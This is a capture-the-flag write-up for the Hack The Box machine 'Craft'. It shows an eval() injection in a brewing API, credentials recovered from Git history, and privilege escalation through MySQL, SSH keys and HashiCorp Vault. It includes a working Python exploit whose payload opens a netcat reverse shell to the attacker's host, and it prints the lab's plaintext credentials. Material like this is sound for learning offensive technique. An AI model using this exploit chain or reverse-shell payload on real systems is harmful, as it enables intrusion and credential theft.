# Hack The Box: Craft

**Difficulty:** Medium
**OS:** Linux

Craft is a Medium-level Linux machine featuring a vulnerable brewing API. The machine demonstrates common oversights in modern software development pipelines, including credential leakage in version control systems and unsafe code evaluation. The initial foothold exploits an `eval()` vulnerability in the API after obtaining valid credentials from previous Git commits. Privilege escalation involves pivoting through a MySQL database, extracting SSH keys, and ultimately using Vault to generate dynamic root SSH credentials.

---

## Reconnaissance

We begin the assessment by scanning the target for open ports and running services using `nmap`.

```bash
nmap -sV -p- 10.10.10.110
```

The scan reveals the following services:
*   **Port 22:** SSH (OpenSSH 7.4p1)
*   **Port 443:** HTTPS (nginx 1.15.8)
*   **Port 6022:** SSH (Go SSH server, likely Gitea or Gogs)

Browsing to the web application over HTTPS on port 443 reveals a landing page that links to two subdomains: `api.craft.htb` and `gogs.craft.htb`. These domains must be added to the local `/etc/hosts` file for proper resolution.

```bash
echo '10.10.10.110 craft.htb api.craft.htb gogs.craft.htb' >> /etc/hosts
```

## Initial Access & Source Code Analysis

Navigating to `gogs.craft.htb` presents a self-hosted Git service (Gogs). Browsing the public repositories reveals the source code for the `craft-api` application running on `api.craft.htb`.

### Analyzing the API

The repository contains the backend code for the brewing API. A critical vulnerability is discovered within the endpoint responsible for creating new brew entries (`craft_api/api/brew/endpoints/brew.py`):

```python
@ns.route('/')
class BrewCollection(Resource):

    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """
        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```

The endpoint insecurely passes user-supplied JSON input (`abv`) directly into Python's `eval()` function, presenting a clear path to Remote Code Execution (RCE). 

However, exploiting this endpoint requires authentication, as indicated by the `@auth.auth_required` decorator. The authentication mechanism (`craft_api/api/auth/endpoints/auth.py`) expects Basic Authentication and returns a JWT token for subsequent requests.

### Git History and Credential Harvesting

Since we have access to the repository's commit history, we can search for sensitive information that may have been committed and later removed. Reviewing the commit logs reveals an older commit titled "Cleanup test":

```bash
git show a2d28ed1554adddfcfb845879bfea09f976ab7c1
```

The diff shows that developer credentials were left hardcoded in a test script:
`-response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)`

## Exploitation

Using the harvested credentials (`dinesh:4aUh0A8PbVJxgd`), we can authenticate with the API to obtain a valid JWT token. We can then leverage this token to send a malicious payload to the vulnerable `/brew/` endpoint, exploiting the `eval()` function to obtain a reverse shell.

We script the exploit using Python:

```python
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = 'https://api.craft.htb/api'

with requests.Session() as session:
    session.verify = False
    session.auth = ('dinesh', '4aUh0A8PbVJxgd')

    # Obtain JWT Token
    token = session.get(BASE_URL + '/auth/login').json()['token']
    session.headers.update({'X-Craft-API-Token': token})
    
    # Trigger RCE via eval()
    payload = """__import__('os').system('nc -e /bin/sh 10.10.X.X 9999')"""
    
    session.post(BASE_URL + '/brew/', json={
        'brewer': 'test',
        'name': 'test',
        'style': 'test',
        'abv': payload
    })
```

Setting up a Netcat listener on port 9999 and running the script catches the reverse shell.

```bash
nc -lnvp 9999
# Connection received
id
# uid=0(root) gid=0(root)
```
Although we have root access, checking the environment indicates we are inside a Docker container.

## Lateral Movement

To escape the containerized environment or pivot deeper into the network, further enumeration is required. The `craft-api` repository also contains a database testing script (`dbtest.py`), which relies on credentials stored in `settings.py`.

Checking the local container filesystem reveals the settings file (`/opt/app/craft_api/settings.py`):

```python
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_HOST = 'db'
```

We can use these credentials to query the centralized MySQL database used by the API. We execute a Python one-liner to dump the `user` table:

```python
import pymysql
from craft_api import settings
# ... connection setup ...
sql = "SELECT * FROM user;"
cursor.execute(sql)
print(cursor.fetchall())
```

This dumps credentials for several users:
*   `dinesh: 4aUh0A8PbVJxgd`
*   `ebachman: llJ77D8QFkLPQB`
*   `gilfoyle: ZEU3N8WNM2rh4T`

Using `gilfoyle`'s credentials, we authenticate back into the Gogs web interface. We discover a private repository named `craft-infra` containing infrastructure configuration files, including `docker-compose.yml` and Gilfoyle's SSH keys (`id_rsa`).

We use the obtained SSH key and the database password (`ZEU3N8WNM2rh4T`) as the passphrase to SSH directly into the underlying host machine.

```bash
ssh -i id_rsa gilfoyle@craft.htb
# Authentication successful
```
We can now read the `user.txt` flag.

## Privilege Escalation

Enumerating Gilfoyle's home directory reveals a `.vault-token` file containing a HashiCorp Vault token.

Reviewing the `craft-infra` repository from Gogs shows how Vault was configured. Specifically, an SSH secrets engine was enabled to generate One-Time Passwords (OTPs) for root access:

```bash
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

With the `.vault-token` automatically exported or sourced by Vault locally, we can utilize the Vault CLI to request an SSH session to the local machine as root.

```bash
vault ssh root@localhost
```

Vault processes the request and generates a temporary OTP for the session.

```text
Vault could not locate "sshpass". The OTP code for the session is displayed below.
OTP for the session is: 2ea20f14-ba74-e89c-6743-55d00e51beac
Password: 
```

Providing the generated OTP at the SSH prompt grants a root shell on the host machine.

```bash
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
```
The machine is fully compromised.
